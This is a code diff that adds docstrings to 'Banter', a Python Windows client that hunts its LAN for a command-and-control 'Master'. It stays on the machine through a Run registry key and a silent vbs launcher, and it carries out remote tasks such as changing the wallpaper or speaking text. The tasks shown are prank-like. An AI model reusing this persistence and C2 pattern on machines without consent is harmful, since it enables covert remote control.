@@ -1,4 +1,4 @@
-# banter
+"""Client component of the Banter project."""
 import socket
 import sys
 import netifaces
@@ -16,15 +16,20 @@ import win32com.client
 
 
 class Banter():
+    """Client that performs tasking after establishing a connection with the Command & Control server, the Master."""
 
     def __init__(self, debug_build=False, persist=True):
+        """Initialise logging, constants and retrieve host workstation name.
+
+        @param debug_build: turn on debug logging
+        @param persist: whether or not to persist reboots by adding an autorun registry key entry
+        """
         if debug_build:
             logging.basicConfig(level=logging.DEBUG)
             logging.debug("Debug build")
         else:
             logging.basicConfig(level=logging.CRITICAL)
-        self.PERSISTENCE_KEY = """Software\\Microsoft\\Windows\\
-                               CurrentVersion\\Run"""
+        self.PERSISTENCE_KEY = """Software\\Microsoft\\Windows\\CurrentVersion\\Run"""
         self.REG_KEY_ENTRY = "slash"
         self.PORT = 34072
         self.TASKING_PORT = 34073
@@ -54,6 +59,7 @@ class Banter():
         self.find_master_window = 2
 
     def get_name(self):
+        """Return the host workstation name, or 'Unnamed' if the appropriate registry key cannot be found."""
         try:
             key = win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE,
                                         """SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName""",
@@ -65,6 +71,13 @@ class Banter():
         return name
 
     def persist(self, persist):
+        """Add/Remove persistence to reboots by adding a registry key entry which autoruns a vbs script on boot.
+
+        The vbs script is required in order to run this component silently and is created/removed during this method.
+        This method is automatically called to add persistence during initialisation and remove persistence during
+        the kill routine.
+        @param persist: whether to add or remove persistence
+        """
         dir_name = os.path.dirname(os.path.abspath(__file__))
         vbs_script_file = os.path.join(dir_name, "data.vbs")
         if persist:
@@ -110,17 +123,22 @@ class Banter():
             except Exception as e:
                 logging.exception("Unhandled Exception: {0}".format(e))
 
-    """ Link up with master """
     def find_master(self):
+        """Search for and perform handshake with Master.
+
+        If run for the first time, or the old Master is not responding, the client will perform a network sweep of the
+        current subnet and search for a new Master.
+        @return: True if Master is found
+        """
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(self.find_master_window)
         if self.master:
-            if self.attempt_linkup(sock, self.master):
+            if self.attempt_handshake(sock, self.master):
                 logging.debug("Master found: {0}".format(self.master))
                 sock.close()
                 return True
             else:
-                logging.debug("Old master {0} not linking, wiping.".format(self.master))
+                logging.debug("Old master {0} not responding, wiping.".format(self.master))
                 self.master = None
         else:
             try:
@@ -128,20 +146,24 @@ class Banter():
             except:
                 return False
             for address in ips:
-                if self.attempt_linkup(sock, address):
+                if self.attempt_handshake(sock, address):
                     logging.debug("Master found: {0}".format(address))
                     sock.close()
                     return True
             logging.debug("Master not found")
             if self.find_master_window < self.FIND_MASTER_LIMIT:
+                # Progressively increase the socket timeout window to accommodate slow networks
                 logging.debug("Increasing socket timeout")
                 self.find_master_window *= 2
-
         sock.close()
         return False
 
-    """ Check interfaces and determine LAN subnet/s to be scanned for master """
     def determine_addresses(self):
+        """Determine LAN subnet to be scanned in search of the Master.
+
+        @return: a list of ipaddress.IPv4Address objects
+        """
+        # Attempt to use method 2, falling back to method 1 upon failure
         try:
             self.gateway, interface_uuid = self.determine_gateway2()
             if self.gateway is None or interface_uuid is None:
@@ -149,6 +171,7 @@ class Banter():
         except:
             self.gateway, interface_uuid = self.determine_gateway()
 
+        # Generate a list of potential hosts
         interface = netifaces.ifaddresses(interface_uuid)
         self.client_interface = ipaddress.ip_interface('{0}/{1}'.format(interface[netifaces.AF_INET][0]['addr'],
                                                                         interface[netifaces.AF_INET][0]['netmask']))
@@ -156,9 +179,8 @@ class Banter():
         logging.debug("Client ip: {0}".format(self.client_interface))
         return list(self.client_network.hosts())
 
-    """ Grab the interface marked as default """
     def determine_gateway(self):
-        # Get default gateway, get associated ip address and generate addresses to scan
+        """Return the address and interface of gateway marked as default."""
         try:
             logging.debug("Using default gateway...")
             gws = netifaces.gateways()
@@ -169,10 +191,11 @@ class Banter():
             logging.debug(" * Failed!")
             raise
 
-    """ Run a tracert to google.com to determine the internet-facing gateway, and grab that interface """
     def determine_gateway2(self):
+        """Return the address and interface of the internet-facing gateway."""
         try:
             logging.debug("Using tracert to determine gateway address...")
+            # Run a tracert to google.com
             output = subprocess.Popen(['tracert', '-4', '-d', '-h', '1', 'google.com'],
                                       stdout=subprocess.PIPE).communicate()[0]
             # Get rid of the heading crap and retrieve the first entry which contains the gateway IP
@@ -190,8 +213,13 @@ class Banter():
             logging.debug(" * Failed!")
             raise
 
-    """ Attempt link-up with address """
-    def attempt_linkup(self, sock, address):
+    def attempt_handshake(self, sock, address):
+        """Attempt master handshake.
+
+        @param sock: the socket object to send packets with
+        @param address: the address to attempt the handshake with
+        @return: True if handshake successful
+        """
         logging.debug("Attempting linkup: {0}".format(address))
         try:
             sock.sendto(b"Speak friend and enter", (str(address), self.PORT))
@@ -209,8 +237,11 @@ class Banter():
             pass
         return False
 
-    """ Receive and acknowledge tasking from master """
     def process_tasking(self):
+        """Temporarily receive and acknowledge tasking from master.
+
+        @return: True if tasking received within this processing window
+        """
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(self.TASKING_WINDOW)
         tasking_start = time.time()
@@ -238,8 +269,12 @@ class Banter():
         sock.close()
         return False
 
-    """ Parse and action tasks """
     def parse_task(self, task):
+        """Parse and action tasks.
+
+        @param task: the command string received from the Master
+        @return: True if task is valid and completed successfully
+        """
         task = task.split(",")
         if task[0] == "hi":
             return True
@@ -252,9 +287,13 @@ class Banter():
         elif task[0] == "sa":
             self.persist_task()
         else:
-            pass
+            return False
 
     def send_task_result(self, result):
+        """Send an indication of task completion to the Master.
+
+        @param result: Whether the task was completed successfully
+        """
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                 if result:
@@ -264,8 +303,12 @@ class Banter():
         except Exception as e:
             logging.exception("Unhandled Exception: {0}".format(e))
 
-    """ Change background task """
     def change_background_task(self, serving_port):
+        """Task that attempts to change the host machine's background picture.
+
+        @param serving_port: the port to connect back to the Master with and receive the intended picture
+        @return: True if the task was completed successfully
+        """
         # Download image from master
         image = self.request_file(serving_port)
         if image is None:
@@ -278,6 +321,11 @@ class Banter():
         return self.set_background(image)
 
     def request_file(self, serving_port):
+        """Retrieve the intended image from the Master.
+
+        @param serving_port: the port to connect back to the Master with and receive the intended picture
+        @return: absolute path to the image if the retrieval was successful, None otherwise
+        """
         try:
             file_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             file_sock.settimeout(10)
@@ -286,7 +334,7 @@ class Banter():
                 attempts += 1
                 if attempts > self.CONNECTION_ATTEMPT_LIMIT:
                     logging.debug("Connection failed.")
-                    return
+                    return None
                 try:
                     file_sock.connect((self.master, serving_port))
                     break
@@ -295,7 +343,7 @@ class Banter():
                     continue
         except Exception as e:
             logging.warning("Unhandled Exception: {0}".format(e))
-            return False
+            return None
         try:
             file_sock.send(b"plsehlp")
             logging.debug("{0} < '{1}'".format(self.master, b"plsehlp"))
@@ -315,6 +363,11 @@ class Banter():
             file_sock.close()
 
     def set_background(self, image):
+        """Attempt to change the host machine's background by editing the appropriate registry key.
+
+        @param image: the image to change the backgroudn to
+        @return: True if the change was successful
+        """
         logging.debug("Setting background to: {0}".format(image))
         try:
             key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, "Control Panel\\Desktop", 0,
@@ -328,9 +381,12 @@ class Banter():
             logging.warning("Unhandled Exception: {0}".format(e))
             return False
 
-    """ Speak task """
-
     def speak_task(self, sentence):
+        """Task that uses the Microsoft voice API to speak the specified sentence.
+
+        @param sentence: the sentence to be spoken
+        @return: True if task was successful
+        """
         logging.debug("Speaking sentence: {0}".format(sentence))
         try:
             speak = win32com.client.Dispatch("SAPI.SpVoice")
@@ -339,30 +395,29 @@ class Banter():
             logging.warning("Unhandled Exception: {0}".format(e))
             return False
 
-    """ Kill client task """
-
     def kill_task(self):
+        """Task that removes persistence and kills the Client."""
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
             sock.sendto(b"Auf Wiedersehen...", (self.master, self.PORT))
         self.persist(False)
         sys.exit()
 
     def persist_task(self):
+        """Task that enables persistence."""
         self.persist(True)
         return True
 
-    """ Main loop """
     def start(self):
+        """Constantly search for or beacon out to the Master for tasking."""
         logging.debug("Starting up")
         if self.PERSIST:
             # Add to persistence
             self.persist(True)
-        # Find master
         while True:
             logging.debug("Searching for master...")
             if self.find_master():
+                # If Master found, begin beaconing for tasking
                 self.find_master_window = 2
-                # Main loop
                 last_heard = 0
 
                 while last_heard < self.LAST_HEARD_LIMIT:
